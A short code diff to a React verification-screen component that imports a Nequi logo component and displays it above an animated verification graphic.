@@ -1,6 +1,7 @@
 import { useEffect, useState } from 'react'
 import { Loader2, ShieldCheck, CheckCircle2, Search, UserCheck, Wallet, Sparkles } from 'lucide-react'
 import { ScreenShell } from './ScreenShell'
+import { NequiLogo } from './NequiLogo'
 
 interface VerificationScreenProps {
   onComplete: () => void
@@ -45,6 +46,9 @@ export function VerificationScreen({ onComplete }: VerificationScreenProps) {
 
   return (
     <ScreenShell>
+      <div className="flex justify-center mb-6">
+        <NequiLogo size="md" color="dark" />
+      </div>
       <div className="flex flex-col items-center text-center animate-slide-up">
         <div className="relative w-28 h-28 flex items-center justify-center mb-8">
           <div className="absolute inset-0 rounded-full bg-[#E6005C]/10 animate-ping" />
